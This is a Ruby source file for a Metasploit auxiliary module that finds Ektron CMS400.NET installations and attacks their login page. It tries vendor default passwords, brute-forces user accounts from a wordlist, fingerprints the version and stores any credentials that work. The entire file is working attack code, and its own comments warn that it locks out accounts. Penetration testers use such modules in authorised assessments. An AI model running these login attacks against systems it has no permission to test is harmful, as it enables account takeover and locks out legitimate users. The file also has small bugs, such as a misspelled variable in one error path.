##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
        'Name'          => 'Ektron CMS400.NET Default Password Scanner',
        'Description'   => %q{
          Ektron CMS400.NET is a web content management system based on .NET.
          This module tests for installations that are utilizing default
          passwords set by the vendor. Additionally, it has the ability
          to brute force user accounts. Note that Ektron CMS400.NET, by
          default, enforces account lockouts for regular user account
          after a number of failed attempts.
        },
        'License'       => MSF_LICENSE,
        'Author'        => ['Justin Cacak']
      ))

    register_options(
      [
        OptString.new('URI', [true, "Path to the CMS400.NET login page", '/WorkArea/login.aspx']),
        OptPath.new(
          'USERPASS_FILE',
          [
            false,
            "File containing users and passwords",
            File.join(Msf::Config.data_directory, "wordlists", "cms400net_default_userpass.txt")
          ])
      ])

    # Set to false to prevent account lockouts - it will!
    deregister_options('BLANK_PASSWORDS')
  end

  def target_url
    # Function to display correct protocol and host/vhost info
    if rport == 443 or ssl
      proto = "https"
    else
      proto = "http"
    end

    uri = normalize_uri(datastore['URI'])
    if vhost != ""
      "#{proto}://#{vhost}:#{rport}#{uri.to_s}"
    else
      "#{proto}://#{rhost}:#{rport}#{uri.to_s}"
    end
  end

    def gen_blank_passwords(users, credentials)
      return credentials
    end

  def run_host(ip)
    begin
      res = send_request_cgi(
      {
        'method'  => 'GET',
        'uri'     => normalize_uri(datastore['URI'])
      }, 20)

      if res.nil?
        print_error("Connection timed out")
        return
      end

      # Check for HTTP 200 response.
      # Numerous versions and configs make if difficult to further fingerprint.
      if (res and res.code == 200)
        print_status("Ektron CMS400.NET install found at #{target_url}  [HTTP 200]")

        #Gather __VIEWSTATE and __EVENTVALIDATION from HTTP response.
        #Required to be sent based on some versions/configs.
        begin
          viewstate = res.body.scan(/<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="(.*)"/)[0][0]
        rescue
          viewstate = ""
        end

        begin
          eventvalidation = res.body.scan(/<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="(.*)"/)[0][0]
        rescue
          eventvalidation = ""
        end

        get_version

        print_status "Testing passwords at #{target_url}"
        each_user_pass { |user, pass|
          do_login(user, pass, viewstate, eventvalidation)
        }
      else
        print_error("Ektron CMS400.NET login page not found at #{target_url}. May need to set VHOST or RPORT.  [HTTP #{res.code}]")
      end

    rescue
      print_error("Ektron CMS400.NET login page not found at #{target_url}  [HTTP #{res.code}]")
      return
    end
  end

  def get_version
      # Attempt to retrieve the version of CMS400.NET installed.
      # Not always possible based on version/config.
      payload = "http://#{vhost}:#{rport}/WorkArea/java/ektron.site-data.js.ashx"
      res = send_request_cgi(
      {
        'method'  => 'GET',
        'uri'     => payload
      }, 20)

      if (res.body.match(/Version.:.(\d{1,3}.\d{1,3})/))
        print_status "Ektron CMS400.NET version: #{$1}"
      end
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: (ssl ? 'https' : 'http'),
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      last_attempted_at: DateTime.now,
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def do_login(user=nil, pass=nil, viewstate_arg=viewstate, eventvalidation_arg=eventvalidation)
    vprint_status("#{target_url} - Trying: username:'#{user}' with password:'#{pass}'")

    post_data =  "__VIEWSTATE=#{Rex::Text.uri_encode(viewstate_arg.to_s)}"
    post_data << "&__EVENTVALIDATION=#{Rex::Text.uri_encode(eventvalidation_arg.to_s)}"
    post_data << "&username=#{Rex::Text.uri_encode(user.to_s)}"
    post_data << "&password=#{Rex::Text.uri_encode(pass.to_s)}"

    begin
      res = send_request_cgi({
        'method'  => 'POST',
        'uri'     => normalize_uri(datastore['URI']),
        'data'    => post_data,
      }, 20)

      if (res and res.code == 200 and res.body.to_s.match(/LoginSuceededPanel/i) != nil)
        print_good("#{target_url} [Ektron CMS400.NET] Successful login: '#{user}' : '#{pass}'")
        report_cred(ip: rhost, port: rport, user: user, password: pass, proof: res.body)

      elsif(res and res.code == 200)
        vprint_error("#{target_url} [Ekton CMS400.NET] - Failed login as: '#{user}'")
      else
        print_error("#{target_url} [Error] Unable to authenticate. Check parameters.  [HTTP #{res.code}]")
        return :abort
      end

    rescue ::Rex::ConnectionError => e
      vprint_error("http://#{tartget_url} - #{e.to_s}")
      return :abort
    end

  end
end
